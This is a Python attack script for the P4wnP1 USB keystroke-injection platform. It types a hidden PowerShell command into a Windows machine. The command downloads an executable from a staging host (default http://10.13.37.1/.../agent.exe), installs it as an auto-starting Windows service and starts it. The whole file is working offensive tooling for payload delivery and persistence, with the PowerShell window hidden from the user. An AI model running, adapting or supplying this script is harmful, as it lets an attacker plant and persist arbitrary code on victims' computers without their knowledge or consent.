#!/usr/bin/env python3
# Creates a Windows service pointing to YOUR binary. You host or stage it; wrapper just wires it.
import os, sys, time
P4WN_HOME=os.getenv("P4WN_HOME","/opt/p4wnp1"); sys.path.insert(0, os.path.join(P4WN_HOME,"tools"))
from hid_type import win_r, type_string

SVC_NAME = os.getenv("P4WN_SVC_NAME","P4wnP1Svc")
BIN_URL  = os.getenv("P4WN_SVC_BIN_URL","http://10.13.37.1/payloads/www/private/agent.exe")
BIN_PATH = os.getenv("P4WN_SVC_BIN_PATH", r"C:\ProgramData\P4wnP1\agent.exe")
START    = os.getenv("P4WN_SVC_START","auto")  # auto|demand|disabled
DESC     = os.getenv("P4WN_SVC_DESC","P4wnP1 helper service")

def main():
    win_r(); time.sleep(0.4); type_string("powershell\n"); time.sleep(0.8)
    ps = (
      f"$u='{BIN_URL}';$p='{BIN_PATH}';$n='{SVC_NAME}';$d='{DESC}';$s='{START}';"
      r"$dir=[IO.Path]::GetDirectoryName($p); New-Item -Force -ItemType Directory -Path $dir >$null;"
      r"$wc=New-Object Net.WebClient; $wc.DownloadFile($u,$p);"
      r"sc.exe create $n binPath= \"$p\" start= $s | Out-Null;"
      r"sc.exe description $n \"$d\" | Out-Null;"
      r"sc.exe start $n | Out-Null;"
    )
    type_string(f"powershell -nop -w hidden -c \"{ps.replace('\"','\"\"')}\"\n")
    print("[*] Service wrapper invoked.")
    return 0

if __name__=='__main__': sys.exit(main())

